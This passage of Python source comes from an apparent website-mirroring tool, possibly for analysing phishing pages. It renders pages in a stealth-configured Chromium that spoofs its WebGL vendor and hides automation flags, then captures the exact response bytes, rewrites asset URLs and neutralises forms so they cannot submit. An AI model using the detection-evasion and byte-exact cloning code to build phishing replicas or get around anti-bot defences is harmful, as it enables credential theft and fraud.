      const real = proto.getParameter;
      proto.getParameter = function (param) {
        if (param === 37445) return 'Intel Inc.';
        if (param === 37446) return 'Intel Iris OpenGL Engine';
        return real.call(this, param);
      };
    }
  } catch (e) {}
})();
"""


async def launch_chromium(pw: Any, proxy: str = "") -> Any:
    """Chromium that does not introduce itself as a robot.

    The `chromium` channel is the full browser in new headless mode, not the
    headless shell: real fonts, a real GPU stack, no `HeadlessChrome` token.
    Falls back to the default build when that channel is not installed.
    """
    args = ["--no-sandbox", "--disable-dev-shm-usage",
            "--disable-blink-features=AutomationControlled", "--lang=en-US"]
    for extra in ({"channel": "chromium"}, {}):
        launch: dict[str, Any] = {"args": args, **extra}
        if proxy:
            launch["proxy"] = {"server": proxy}
        try:
            return await pw.chromium.launch(**launch)
        except Exception:
            continue
    raise RenderError("chromium would not start — python -m playwright install chromium")


@dataclass
class RenderResult:
    html: str
    final_url: str
    resources: list[str] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    rendered: bool = False
    # "captured" when the document written is byte for byte what the server sent,
    # "dom" when the page had to be taken from the finished DOM instead (the bytes
    # were a shell and a script built the page).
    html_from: str = "dom"
    # visible text in the live page: the gate's baseline. A sparse page is not a
    # broken page, so the mirror is graded against what the source actually showed.
    text_len: int = 0
    # url -> (body, content-type) for every response the browser actually received.
    # These bytes beat a second HTTP fetch: they carry the cookies, the auth header
    # the page's own script set, and the exact compressed-to-decoded result the
    # browser rendered with. A second fetch is a different response, sometimes a
    # different asset.
    captured: dict[str, tuple[bytes, str]] = field(default_factory=dict)


# The browser will happily pull two hundred megabytes of video through a headless
# render. These ceilings are what keeps "exact" from becoming "out of memory".
CAPTURE_FILES = 900
CAPTURE_BYTES = 256 * 1024 * 1024
CAPTURE_KINDS = ("document", "stylesheet", "script", "image", "font", "xhr", "fetch",
                 "media", "manifest", "other")


SCROLL_SCRIPT = """
async () => {
  const step = Math.max(320, Math.floor(window.innerHeight * 0.9));
  let last = -1, guard = 0;
  while (guard++ < 60) {
    window.scrollBy(0, step);
    await new Promise(r => setTimeout(r, 140));
    const bottom = window.scrollY + window.innerHeight >=
                   document.documentElement.scrollHeight - 8;
    if (bottom && window.scrollY === last) break;
    last = window.scrollY;
  }
  window.scrollTo(0, 0);
  await new Promise(r => setTimeout(r, 220));
  return document.documentElement.scrollHeight;
}
"""


async def render_page(url: str, proxy: str = "", ua: str = "",
                      width: int = 1440, height: int = 900,
                      scroll: bool = True, prefer: str = "captured") -> RenderResult:
    """Open the page in Chromium and keep the finished DOM.

    Every stage is bounded: a hard navigation timeout, a scroll pass with a step
    ceiling, a quiet-network wait that gives up rather than hangs. A page that
    never settles still returns whatever it had when the clock ran out.

    `prefer` decides which document gets mirrored. "captured" writes the response
    body the server actually sent — same doctype, same entities, same attribute
    quoting, same whitespace — unless that body is a client-rendered shell, in
    which case the finished DOM is the only thing that is still a page. "dom"
    always takes the finished DOM; the healer asks for it when the byte copy came
    back sparse.
    """
    if playwright_mod is None:
        raise RenderError("playwright is not installed — pip install playwright, then "
                          "python -m playwright install chromium")
    from playwright.async_api import async_playwright

    resources: list[str] = []
    errors: list[str] = []
    captured: dict[str, tuple[bytes, str]] = {}
    capture_bytes = 0

    async def grab(response: Any) -> None:
        """Keep the body of a response the browser already received."""
        nonlocal capture_bytes
        if response.status >= 400 or response.status == 304:
            return
        if response.url in captured or len(captured) >= CAPTURE_FILES:
            return
        try:
            if response.request.resource_type not in CAPTURE_KINDS:
                return
        except Exception:
            pass
        try:
            ctype = (await response.header_value("content-type")) or ""
        except Exception:
            ctype = ""
        try:
            body = await response.body()
        except Exception:
            return       # already evicted from the buffer, or a redirect shell
        if not body or len(body) > PER_ASSET_CAP:
            return
        if capture_bytes + len(body) > CAPTURE_BYTES:
            return
        captured[response.url] = (body, ctype)
        capture_bytes += len(body)

    async with async_playwright() as pw:
        browser = await launch_chromium(pw, proxy)
        try:
            context = await browser.new_context(
                user_agent=ua or UA_POOL[0],
                viewport={"width": width, "height": height},
                ignore_https_errors=True,
                java_script_enabled=True,
                locale="en-US",
                extra_http_headers={"Accept-Language": "en-US,en;q=0.9"},
            )
            await context.add_init_script(STEALTH_JS)
            page = await context.new_page()

            def on_response(response: Any) -> None:
                resources.append(response.url)
                # The listener is synchronous; the body read is not. Handing it to a
                # task keeps the parser moving while the bytes land.
                with contextlib.suppress(RuntimeError):
                    asyncio.ensure_future(grab(response))

            page.on("response", on_response)
            page.on("pageerror", lambda exc: errors.append(str(exc).splitlines()[0][:220]))
            await page.goto(url, wait_until="load", timeout=RENDER_TIMEOUT_MS)
            if scroll:
                with contextlib.suppress(Exception):
                    await page.evaluate(SCROLL_SCRIPT)
            with contextlib.suppress(Exception):
                await page.wait_for_load_state("networkidle", timeout=NETWORK_IDLE_MS)
            await page.wait_for_timeout(350)
            dom_html = await page.content()
            final = page.url or url
            text_len = 0
            with contextlib.suppress(Exception):
                text_len = int(await page.evaluate(
                    "() => (document.body && document.body.innerText || '').trim().length"))
            await context.close()
        finally:
            await browser.close()

    # The response body beats the DOM for fidelity — but not when the body is a
    # 400-byte shell and a bundle drew the page a moment later.
    html, source = dom_html, "dom"
    if prefer == "captured":
        for key in (final, url):
            entry = captured.get(key)
            if entry and "html" in entry[1].lower():
                sent = decode_body(entry[0], entry[1])
                if visible_len(sent) * 3 >= max(text_len, 1):
                    html, source = sent, "captured"
                break

    return RenderResult(html=html, final_url=final, resources=resources[:1200],
                        errors=errors[:80], rendered=True, text_len=text_len,
                        captured=captured, html_from=source)


# ---------------------------------------------------------------------------
# 6. asset extractor
#
# Two passes over the same document: the DOM attributes a browser honours, and the
# text a browser also honours but a selector does not see — style blocks, style
# attributes, srcset lists and meta refresh.
# ---------------------------------------------------------------------------

ATTR_REFS: dict[str, tuple[str, ...]] = {
    "img": ("src", "data-src", "data-original", "data-lazy-src"),
    "source": ("src",),
    "script": ("src",),
    "link": ("href",),
    "video": ("src", "poster"),
    "audio": ("src",),
    "iframe": ("src",),
    "embed": ("src",),
    "object": ("data",),
    "track": ("src",),
    "input": ("src",),
    "use": ("href", "xlink:href"),
    "image": ("href", "xlink:href"),
}

SRCSET_ATTRS = ("srcset", "data-srcset", "imagesrcset")

# Every attribute whose value is one URL. `data` is on the list for <object>, and
# `content` is handled separately because it is only a URL inside a meta refresh.
URL_ATTRS = frozenset({
    "src", "href", "xlink:href", "poster", "data", "background", "manifest",
    "formaction", "longdesc", "lowsrc", "dynsrc", "ping",
})

# Lazy loaders park the real URL in one of these until a script swaps it in.
# Missing them is why a mirror scrolls up blank.
LAZY_ATTRS = frozenset({
    "data-src", "data-original", "data-lazy-src", "data-lazy", "data-url",
    "data-image", "data-bg", "data-background", "data-background-image",
    "data-thumb", "data-thumbnail", "data-hi-res-src", "data-full-src",
    "data-zoom-image", "data-master", "data-poster", "data-video-src",
})

URL_FUNC_RE = re.compile(r"""url\(\s*(['"]?)(?P<url>[^'")]*?)\1\s*\)""", re.I)
# The optional trailing paren is the whole point: `@import url("x")` must be consumed
# as one construct, or the rewrite leaves `@import "x");` behind. The tail keeps the
# media query — dropping it turns a print sheet into a screen sheet.
CSS_IMPORT_RE = re.compile(
    r"""@import\s+(?:url\(\s*(?P<q1>['"]?)(?P<u1>[^'")]+)(?P=q1)\s*\)"""
    r"""|(?P<q2>['"])(?P<u2>[^'"]+)(?P=q2))(?P<tail>[^;]*);""", re.I)
META_REFRESH_RE = re.compile(r"""url\s*=\s*(?P<url>[^;]+)""", re.I)
SRCSET_SPLIT_RE = re.compile(r"\s*,\s*(?=[^\s])")

# -- in-place document surgery ------------------------------------------------
# A mirror that re-serialises its own document is not a mirror. BeautifulSoup
# normalises attribute quoting, reorders and drops nothing, escapes text inside
# <pre>, and rewrites inline <script> bodies through an HTML escaper — every one of
# which changes what the browser sees. So the rewriter below never rebuilds a
# document: it scans tag boundaries, edits individual attribute value spans, and
# leaves every other byte exactly where it found it.
TAG_OPEN_RE = re.compile(r"<(?P<close>/?)(?P<name>[a-zA-Z][a-zA-Z0-9:._-]*)")

ATTR_TOKEN_RE = re.compile(
    r"""(?P<pre>\s+)
        (?P<name>[^\s=/>"'<]+)
        (?:\s*=\s*
           (?:"(?P<dq>[^"]*)"|'(?P<sq>[^']*)'|(?P<uq>[^\s>"']+))
        )?""",
    re.X,
)

# Bodies that are not markup: `<` inside them starts nothing.
RAW_BODIES = ("script", "style", "textarea", "title")


def _tag_end(text: str, start: int) -> int:
    """Index just past the `>` closing the tag that opens at `start`.

    Quoted attribute values may contain `>`, so a naive find() truncates real tags.
    Returns -1 when the document ends mid-tag — a truncated mirror is still written,
    never guessed at.
    """
    quote = ""
    i = start + 1
    limit = len(text)
    while i < limit:
        ch = text[i]
        if quote:
            if ch == quote:
                quote = ""
        elif ch in "\"'":
            quote = ch
        elif ch == ">":
            return i + 1
        i += 1
    return -1


def _value_span(match: re.Match[str]) -> Optional[tuple[int, int]]:
    """Where the attribute's value sits, relative to the match. None if valueless."""
    for group in ("dq", "sq", "uq"):
        if match.group(group) is not None:
            return match.span(group)
    return None


def _apply_ops(text: str, ops: list[tuple[int, int, str]]) -> str:
    """Splice (start, end, replacement) spans in one pass, right to left."""
    if not ops:
        return text
    ops.sort(key=lambda item: item[0], reverse=True)
    out = text
    floor = len(text) + 1
    for start, end, replacement in ops:
        if end > floor:          # overlapping edit: the earlier span already won
            continue
        out = out[:start] + replacement + out[end:]
        floor = start
    return out


@dataclass
class Ref:
    url: str
    kind: str
    via: str           # dom · style · attr · meta · network · css
    tag: str = ""
    attr: str = ""


def css_refs(text: str, base_url: str) -> list[str]:
    """Every url() and @import target in a stylesheet, resolved against its own URL.

    tinycss2 does the tokenising when it is installed; the regex path exists so a
    missing extra degrades to "slightly less precise", never to "no styles".
    """
    found: list[str] = []
    if tinycss2 is not None:
        try:
            rules = tinycss2.parse_stylesheet(text, skip_comments=True, skip_whitespace=True)
            for rule in rules:
                if rule.type == "at-rule" and rule.lower_at_keyword == "import":
                    for token in rule.prelude or ():
                        value = getattr(token, "value", None)
                        if isinstance(value, str) and value.strip():
                            found.append(absolutize(base_url, value))
                            break
                if rule.type == "qualified-rule":
                    for token in tinycss2.parse_component_value_list(rule.content):
                        if getattr(token, "type", "") == "url":
                            found.append(absolutize(base_url, token.value))
                        elif getattr(token, "type", "") == "function" and \
                                token.lower_name == "url":
                            for inner in token.arguments:
                                value = getattr(inner, "value", None)
                                if isinstance(value, str):
                                    found.append(absolutize(base_url, value))
                                    break
        except Exception:
            found.extend(_css_refs_regex(text, base_url))
    else:
        found.extend(_css_refs_regex(text, base_url))
    return [item for item in dict.fromkeys(found) if item]


def _css_refs_regex(text: str, base_url: str) -> list[str]:
    out = [absolutize(base_url, match.group("url"))
           for match in URL_FUNC_RE.finditer(text)]
    out += [absolutize(base_url, match.group("url"))
            for match in CSS_IMPORT_RE.finditer(text)]
    return [item for item in out if item]


def kind_of_ref(url: str, tag: str = "") -> str:
    kind = kind_from_url(url)
    if kind != "other":
        return kind
    if tag in ("script",):
        return "js"
    if tag in ("link", "style"):
        return "css"
    if tag in ("img", "image", "source", "video", "audio"):
        return "image"
    if tag == "iframe":
        return "html"
    if tag in ("use",):
        return "svg"
    return "other"


@dataclass
class Extraction:
    refs: list[Ref] = field(default_factory=list)
    links: list[str] = field(default_factory=list)
    inline_css: list[str] = field(default_factory=list)
    meta_refresh: str = ""
    title: str = ""


def extract_refs(html: str, page_url: str) -> Extraction:
    """Pull every reference out of a rendered document, resolved to absolute URLs."""
    result = Extraction()
    seen: set[str] = set()
    soup = None
    if bs4 is not None:
        try:
            soup = bs4.BeautifulSoup(html, "lxml")
        except Exception:
            soup = bs4.BeautifulSoup(html, "html.parser")

    def add(raw: str, tag: str, attr: str, via: str = "dom") -> None:
        absolute = absolutize(page_url, raw)
        if not absolute or absolute in seen:
            return
        seen.add(absolute)
        result.refs.append(Ref(url=absolute, kind=kind_of_ref(absolute, tag), via=via,
                               tag=tag, attr=attr))

    if soup is not None:
        if soup.title and soup.title.string:
            result.title = soup.title.string.strip()[:160]
        for tag in soup.find_all(True):
            name = (tag.name or "").lower()
            # Per-tag attributes first, then the lazy-loader back catalogue: a
            # gallery that parks its full-size URL in data-original is not empty,
            # it is just waiting for a script that will never run offline.
            for attr in tuple(ATTR_REFS.get(name, ())) + tuple(LAZY_ATTRS):
                value = tag.get(attr)
                if isinstance(value, str) and value.strip():
                    add(value, name, attr)
            for attr in SRCSET_ATTRS:
                value = tag.get(attr)
                if not isinstance(value, str) or not value.strip():
                    continue
                for candidate in SRCSET_SPLIT_RE.split(value.strip()):
                    candidate = candidate.strip().split(" ")[0]
                    if candidate:
                        add(candidate, name, attr)
            style = tag.get("style")
            if isinstance(style, str) and "url(" in style.lower():
                for url in css_refs(style, page_url):
                    add(url, name, "style", "style")
            if name == "style" and tag.string:
                block = str(tag.string)
                result.inline_css.append(block)
                for url in css_refs(block, page_url):
                    add(url, "style", "block", "style")
            if name == "meta" and (tag.get("http-equiv") or "").lower() == "refresh":
                match = META_REFRESH_RE.search(tag.get("content") or "")
                if match:
                    result.meta_refresh = match.group("url").strip().strip("'\"")
                    add(result.meta_refresh, "meta", "refresh", "meta")
            if name == "a" and tag.get("href"):
                link = absolutize(page_url, tag.get("href") or "")
                if link and link not in result.links:
                    result.links.append(link)
            if name == "base" and tag.get("href"):
                # A <base> tag changes what every relative reference means; the
                # extractor already resolved against the page URL, so the tag is
                # dropped from the mirror rather than left to break the copy.
                tag.decompose()

    if not result.refs and soup is None:
        # No parser at all: fall back to the crudest possible sweep.
        for match in re.finditer(r"""(?:href|src)\s*=\s*["'](?P<u>[^"']+)["']""", html):
            add(match.group("u"), "unknown", "attr")
    return result


# ---------------------------------------------------------------------------
# 7. downloader
#
# One client, bounded concurrency, three attempts with a rotated user agent and the
# page as referer. Identical bytes are stored once: the second copy is a pointer, so
# a page that references the same logo nine times costs one file.
# ---------------------------------------------------------------------------


class BudgetExceeded(RuntimeError):
    pass


class Downloader:
    def __init__(self, options: Options, job: Job, root: Path,
                 captured: Optional[dict[str, tuple[bytes, str]]] = None):
        self.options = options
        self.job = job
        self.root = root
        self.limits = asyncio.Semaphore(max(1, options.concurrency))
        self.canonical: dict[str, str] = {}     # sha1 -> mirror path
        self.client: Any = None
        self.lock = asyncio.Lock()
        # Bytes the browser already received during render. Checked before the
        # network, so an exact copy never depends on the origin answering twice.
        self.captured = captured or {}
        self.capture_hits = 0

    async def __aenter__(self) -> "Downloader":
        if httpx is None:
            raise RenderError("httpx is not installed — pip install httpx")
        self.client = httpx.AsyncClient(
            follow_redirects=True, timeout=HTTP_TIMEOUT, http2=False,
            proxy=self.options.proxy or None,
            headers={"Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"},
            limits=httpx.Limits(max_connections=max(8, self.options.concurrency * 2),
                                max_keepalive_connections=8),
        )
        return self

    async def __aexit__(self, *exc: Any) -> None:
        if self.client is not None:
            await self.client.aclose()

    async def fetch(self, url: str, referer: str = "") -> tuple[Optional[bytes], str, int, str]:
        """(bytes, content_type, status, error). Never raises for a network problem —
        a failed asset is data, and the heal loop is where it gets a second chance."""
        last_error = ""
        status = 0
        for attempt in range(DOWNLOAD_RETRIES):
            headers = {"User-Agent": UA_POOL[attempt % len(UA_POOL)]}
            if referer:
                headers["Referer"] = referer
            try:
                async with self.limits:
                    response = await self.client.get(url, headers=headers)
                status = response.status_code
                if status >= 400:
                    last_error = f"HTTP {status}"
                    if status in (429, 500, 502, 503, 504):
                        await asyncio.sleep(0.6 * (2 ** attempt))
                        continue
                    return None, "", status, last_error
                data = response.content
                if len(data) > PER_ASSET_CAP:
                    return None, response.headers.get("content-type", ""), status, \
                        f"larger than {human_bytes(PER_ASSET_CAP)}"
                return data, response.headers.get("content-type", ""), status, ""
            except asyncio.TimeoutError:
                last_error = "timeout"
            except Exception as exc:
                last_error = f"{type(exc).__name__}: {exc}"[:160]
            await asyncio.sleep(0.4 * (2 ** attempt))
        return None, "", status, last_error or "failed"

    async def store(self, asset: Asset, data: bytes, content_type: str) -> None:
        """Write the bytes once per hash. A duplicate reference points at the file
        that already exists instead of growing the mirror."""
        digest = sha1_of(data)
        async with self.lock:
            if digest in self.canonical:
                asset.local = self.canonical[digest]
                asset.sha1 = digest
                asset.size = len(data)
                asset.content_type = content_type
                asset.status = "done"
                return
            rel = asset_relpath(asset.url, asset.kind)
            write_bytes(self.root, rel, data)
            self.canonical[digest] = rel
            asset.local = rel
            asset.sha1 = digest
            asset.size = len(data)
            asset.content_type = content_type
            asset.status = "done"
            self.job.bytes += len(data)
            if self.job.bytes > CONFIG.max_bytes:
                raise BudgetExceeded(f"mirror passed {human_bytes(CONFIG.max_bytes)}")

    async def download(self, refs: Iterable[Ref], page_url: str) -> None:
        """Work a queue of refs to exhaustion, adding CSS children as they appear.

        The queue is bounded by `max_assets`; each round is a batch of `concurrency`
        fetches. Stylesheets are parsed on arrival so `@import` chains and font files
        are picked up without a second crawl pass.
        """
        queue: list[Ref] = []
        queued: set[str] = set()
        for ref in refs:
            if ref.url in queued:
                continue
            existing = self.job.assets.get(ref.url)
            if existing is not None and existing.status in ("done", "placeholder"):
                continue          # already on disk from a previous pass
            queued.add(ref.url)
            queue.append(ref)

        rounds = 0
        left_out = 0
        while queue and rounds < 400:
            rounds += 1
            batch, queue = queue[: self.options.concurrency * 2], queue[self.options.concurrency * 2:]
            results = await asyncio.gather(
                *(self._one(ref, page_url) for ref in batch), return_exceptions=True)
            for ref, outcome in zip(batch, results):
                if isinstance(outcome, BudgetExceeded):
                    self.job.log(f"mirror size ceiling reached at {human_bytes(self.job.bytes)}",
                                 "warn")
                    return
                if isinstance(outcome, Exception):
                    self.job.log(f"asset error · {ref.url} · {outcome}", "error")
                    continue
                if not outcome:
                    continue
                for child in outcome:
                    if child.url in self.job.assets or child.url in queued:
                        continue
                    if len(self.job.assets) + len(queued) >= self.options.max_assets:
                        # a stylesheet's own references are fonts, sprites and icons:
                        # dropping them is the difference between the page and a
                        # page wearing the fallback face. Counted, never silent.
                        left_out += 1
                        continue
                    queued.add(child.url)
                    queue.append(child)
        if left_out:
            self.job.log(f"asset ceiling {self.options.max_assets} · {left_out} stylesheet "
                         f"reference(s) left out — raise the ceiling for a whole face", "warn")

    async def _one(self, ref: Ref, page_url: str) -> list[Ref]:
        asset = self.job.assets.get(ref.url) or Asset(url=ref.url, kind=ref.kind, via=ref.via)
        self.job.assets[ref.url] = asset
        asset.status = "fetching"
        asset.attempts += 1
        self.job.emit({"event": "asset", "url": ref.url, "kind": asset.kind,
                       "status": "fetching", "size": 0})

        # Exactness first: if the browser already had these bytes, keep them. A
        # second HTTP request re-negotiates encoding, may lose a signed URL, and can
        # return a different variant than the one the render actually used.
        data: Optional[bytes] = None
        content_type, status, error = "", 200, ""
        captured = self.captured.get(ref.url)
        if captured is None:
            bare = ref.url.split("#", 1)[0]
            captured = self.captured.get(bare)
        if captured is not None:
            data, content_type = captured
            self.capture_hits += 1
        else:
            data, content_type, status, error = await self.fetch(ref.url, page_url)

        if data is None:
            # The reference still gets a local path so the page points inside the
            # mirror and the heal loop can see the hole. A failed asset that stays
            # absolute is invisible to every gate.
            asset.status = "failed"
            asset.local = asset_relpath(ref.url, asset.kind)
            asset.error = error
            self.job.failures += 1
            self.job.emit({"event": "asset", "url": ref.url, "kind": asset.kind,
                           "status": "failed", "size": 0, "error": error})
            return []

        if content_type:
            hinted = CONTENT_KIND.get(content_type.split(";")[0].strip().lower(), "")
            if hinted and asset.kind in ("other", "image"):
                asset.kind = hinted
        await self.store(asset, data, content_type)
        self.job.emit({"event": "asset", "url": ref.url, "kind": asset.kind,
                       "status": "done", "size": asset.size})
        children: list[Ref] = []
        if asset.kind == "css":
            text = decode_body(data, content_type)
            for child_url in css_refs(text, ref.url):
                child_kind = kind_from_url(child_url) or "image"
                children.append(Ref(url=child_url, kind=child_kind, via="css", tag="css"))
        return children

# ---------------------------------------------------------------------------
# 8. rewriter
#
# Three dialects, one rule: a reference that resolves inside the mirror becomes a
# relative path, a reference that does not stays absolute and keeps working online.
# Nothing is silently dropped — an unmapped external URL is left exactly as found.
# ---------------------------------------------------------------------------

LOCAL_ATTR_RE = re.compile(
    r"""(?P<attr>src|href|poster|data)\s*=\s*(?P<q>["'])(?P<url>[^"']*)(?P=q)""", re.I)


class Rewriter:
    def __init__(self, job: Job):
        self.job = job
        self.assets: dict[str, str] = {url: asset.local for url, asset in job.assets.items()
                                       if asset.local}
        self.pages: dict[str, str] = {page.url: page.local for page in job.pages if page.local}

    def refresh(self) -> None:
        self.assets = {url: asset.local for url, asset in self.job.assets.items()
                       if asset.local}
        self.pages = {page.url: page.local for page in self.job.pages if page.local}

    # -- css ---------------------------------------------------------------
    def rewrite_css(self, text: str, css_rel: str, base_url: str) -> tuple[str, int]:
        hits = 0

        # @import first: it may wrap url(), and the url() pass would otherwise leave
        # the closing paren stranded behind the rewritten string. The media tail is
        # carried through verbatim, so `@import "a.css" print;` stays a print sheet.
        def one_import(match: re.Match[str]) -> str:
            nonlocal hits
            raw = (match.group("u1") or match.group("u2") or "").strip()
            absolute = absolutize(base_url, raw)
            local = self.assets.get(absolute)
            if not local:
                return match.group(0)
            hits += 1
            return f'@import "{relref(css_rel, local)}"{match.group("tail")};'

        text = CSS_IMPORT_RE.sub(one_import, text)

        def one_url(match: re.Match[str]) -> str:
            nonlocal hits
            raw = (match.group("url") or "").strip()
            if not raw or raw.startswith("data:") or raw.startswith("#"):
                return match.group(0)
            local = self._local_for(raw, base_url, css=True)
            if not local:
                return match.group(0)
            hits += 1
            return f'url("{relref(css_rel, local)}")'

        return URL_FUNC_RE.sub(one_url, text), hits

    # -- js ----------------------------------------------------------------
    def rewrite_js(self, text: str, js_rel: str, base_url: str) -> tuple[str, int]:
        """Static JS strings carry asset URLs for lazy loaders and fetch calls. The
        mapped ones are pointed at the local file; everything else is untouched."""
        hits = 0
        for absolute in sorted(self.assets, key=len, reverse=True):
            local = self.assets[absolute]
            target = relref(js_rel, local)
            if absolute in text:
                hits += text.count(absolute)
                text = text.replace(absolute, target)
            bare = absolute.split("://", 1)[-1]
            for form in (f"//{bare}", f"\\/\\/{bare}"):
                if form in text:
                    hits += text.count(form)
                    text = text.replace(form, target)
        return text, hits

    # -- lookup ------------------------------------------------------------
    def _local_for(self, raw: str, base_url: str, css: bool = False) -> str:
        """The mirror path for a reference, or "" when it stays external."""
        value = raw.strip()
        if not value or value.startswith(("data:", "blob:", "javascript:", "mailto:",
                                          "tel:", "#")):
            return ""
        absolute = absolutize(base_url, value)
        if not absolute:
            return ""
        local = self.assets.get(absolute) or self.pages.get(absolute)
        if local:
            return local
        # `?v=3` and `#frag` are cache-busters and anchors: the file on disk is the
        # same one either way, and leaving the query on breaks the local path.
        trimmed = norm_url(absolute)
        if trimmed != absolute:
            local = self.assets.get(trimmed) or self.pages.get(trimmed)
            if local:
                return local
        bare = absolute.split("?", 1)[0].split("#", 1)[0]
        return self.assets.get(bare) or self.pages.get(bare) or ""

    # -- html --------------------------------------------------------------
    def rewrite_doc(self, html: str, page_rel: str, page_url: str) -> tuple[str, int]:
        """Rewrite the document in place. No parser, no re-serialisation.

        Every byte the original had is still there afterwards except the attribute
        values that pointed at the network, the SRI hashes that would now mismatch,
        and the URLs inside style and script bodies — which is the entire job.
        """
        ops: list[tuple[int, int, str]] = []
        hits = 0
        i, limit = 0, len(html)
        lower = html.lower()

        while i < limit:
            lt = html.find("<", i)
            if lt < 0:
                break
            if html.startswith("<!--", lt):
                end = html.find("-->", lt + 4)
                i = limit if end < 0 else end + 3
                continue
            if html.startswith("<!", lt) or html.startswith("<?", lt):
                end = html.find(">", lt + 1)
                i = limit if end < 0 else end + 1
                continue
            opener = TAG_OPEN_RE.match(html, lt)
            if not opener:
                i = lt + 1
                continue
            end = _tag_end(html, lt)
            if end < 0:
                break                      # truncated tag: stop, never guess
            name = opener.group("name").lower()
            closing = opener.group("close") == "/"

            if not closing:
                span_ops, added = self._tag_ops(html, opener.end(), end, name,
                                                page_rel, page_url)
                ops.extend(span_ops)
                hits += added
                if name == "base" and self._has_attr(html, opener.end(), end, "href"):
                    # Every relative reference now means the mirror, not the origin.
                    # The extractor already resolved against the page URL.
                    ops.append((lt, end, ""))
                    hits += 1
                if name in RAW_BODIES:
                    closer = lower.find(f"</{name}", end)
                    body_end = limit if closer < 0 else closer
                    body = html[end:body_end]
                    if body and name in ("style", "script"):
                        if name == "style":
                            new_body, count = self.rewrite_css(body, page_rel, page_url)
                        else:
                            new_body, count = self.rewrite_js(body, page_rel, page_url)
                        if count:
                            ops.append((end, body_end, new_body))
                            hits += count
                    i = body_end
                    continue
            i = end

        return _apply_ops(html, ops), hits

    @staticmethod
    def _has_attr(html: str, name_start: int, tag_end: int, wanted: str) -> bool:
        for match in ATTR_TOKEN_RE.finditer(html[name_start:tag_end]):
            if match.group("name").lower() == wanted:
                return True
        return False

    def _tag_ops(self, html: str, name_start: int, tag_end: int,
                 name: str, page_rel: str, page_url: str
                 ) -> tuple[list[tuple[int, int, str]], int]:
        """Edits for one tag, expressed as spans into the original document."""
        ops: list[tuple[int, int, str]] = []
        hits = 0
        inner = html[name_start:tag_end]
        localised = False
        strip: list[tuple[int, int]] = []
        allowed = ATTR_REFS.get(name, ())

        for match in ATTR_TOKEN_RE.finditer(inner):
            attr = match.group("name").lower()
            span = _value_span(match)
            is_url = attr in URL_ATTRS or attr in allowed or attr in LAZY_ATTRS

            if attr in ("integrity", "crossorigin") and name in (
                    "link", "script", "img", "source", "video", "audio"):
                strip.append((name_start + match.start(), name_start + match.end()))
                continue
            if span is None:
                continue

            start, finish = name_start + span[0], name_start + span[1]
            raw = html[start:finish]

            if attr in SRCSET_ATTRS:
                rebuilt, changed = self._rebuild_srcset(raw, page_rel, page_url)
                if changed:
                    ops.append((start, finish, rebuilt))
                    hits += 1
                    localised = True
            elif is_url:
                local = self._local_for(raw, page_url)
                if local:
                    ops.append((start, finish, relref(page_rel, local)))
                    hits += 1
                    localised = True
                elif name in ("link", "script") and raw.startswith("//"):
                    ops.append((start, finish, "https:" + raw))
            elif attr == "style" and "url(" in raw.lower():
                new_style, count = self.rewrite_css(raw, page_rel, page_url)
                if count:
                    ops.append((start, finish, new_style))
                    hits += count
                    localised = True
            elif attr == "content" and name == "meta":
                new_content, count = self._rewrite_meta(raw, page_rel, page_url)
                if count:
                    ops.append((start, finish, new_content))
                    hits += count

        # An SRI hash over bytes we just changed is a load failure, not a safety
        # feature. It only comes off when the tag actually points into the mirror.
        if localised:
            ops.extend((start, end, "") for start, end in strip)
        return ops, hits

    def _rebuild_srcset(self, value: str, page_rel: str,
                        page_url: str) -> tuple[str, bool]:
        rebuilt: list[str] = []
        changed = False
        for candidate in SRCSET_SPLIT_RE.split(value.strip()):
            if not candidate.strip():
                continue
            pieces = candidate.strip().split()
            local = self._local_for(pieces[0], page_url)
            if local:
                pieces[0] = relref(page_rel, local)
                changed = True
            rebuilt.append(" ".join(pieces))
        return ", ".join(rebuilt), changed

    def _rewrite_meta(self, value: str, page_rel: str,
                      page_url: str) -> tuple[str, int]:
        match = META_REFRESH_RE.search(value)
        if not match:
            return value, 0
        local = self._local_for(match.group("url").strip(), page_url)
        if not local:
            return value, 0
        delay = (value.split(";")[0] or "0").strip() or "0"
        if local == page_rel:
            return value, 0          # a refresh pointing at itself is a reload loop
        return f"{delay}; url={relref(page_rel, local)}", 1

    def rewrite_stored(self, page: Page) -> int:
        """Re-apply rewriting to whatever is on disk for this page."""
        mirror = Path(self.job.mirror)
        html = read_text(mirror_path(mirror, page.local))
        if not html:
            return 0
        new_html, hits = self.rewrite_doc(html, page.local, page.url)
        if hits:
            write_text(mirror, page.local, new_html)
        return hits


# ---------------------------------------------------------------------------
# 9. sanitizer
#
# A mirror keeps a form looking exactly like the original and makes sure it goes
# nowhere. Action stripped, handler removed, one capture-phase listener eating every
# submit before the page's own script sees it.
# ---------------------------------------------------------------------------

SUBMIT_GUARD = (
    '<script data-phishurl="guard">(function(){'
    'var stop=function(e){var t=e.target;'
    'if(t&&(t.tagName==="FORM"||(t.form&&t.tagName!=="INPUT"))){'
    'e.preventDefault();e.stopPropagation();'
    'var t2=e.target;if(t2&&t2.reportValidity){try{t2.reportValidity();}catch(x){}}'
    '}};'
    'document.addEventListener("submit",stop,true);'
    '})();</script>'
)


FORM_DROP = ("method", "target", "onsubmit", "onreset", "enctype", "novalidate",
             "action")


def _form_ops(html: str, name_start: int, tag_end: int) -> list[tuple[int, int, str]]:
    """Strip every way a form can post somewhere, then pin action to '#'."""
    ops: list[tuple[int, int, str]] = []
    has_action = False
    for match in ATTR_TOKEN_RE.finditer(html[name_start:tag_end]):
        attr = match.group("name").lower()
        if attr not in FORM_DROP:
            continue
        span = _value_span(match)
        whole = (name_start + match.start(), name_start + match.end(), "")
        if attr == "action":
            has_action = True
            if span is None:
                ops.append(whole)
            else:
                ops.append((name_start + span[0], name_start + span[1], "#"))
        else:
            ops.append(whole)
    if not has_action:
        ops.append((name_start, name_start, ' action="#"'))
    return ops


def sanitize_forms(html: str) -> tuple[str, int]:
    """Neutralise every form without rebuilding the document.

    The same rule as the rewriter: edit spans, never re-serialise. A sanitised
    mirror that has been through a parser and back is a different document, and a
    different document is not a copy. Two edits only — the attributes that let a
    form post, and one guard script — everything else survives byte for byte.
    """
    ops: list[tuple[int, int, str]] = []
    forms = 0
    i, limit = 0, len(html)
    lower = html.lower()

    while i < limit:
        lt = html.find("<", i)
        if lt < 0:
            break
        if html.startswith("<!--", lt):
            end = html.find("-->", lt + 4)
            i = limit if end < 0 else end + 3
            continue
        if html.startswith("<!", lt) or html.startswith("<?", lt):
            end = html.find(">", lt + 1)
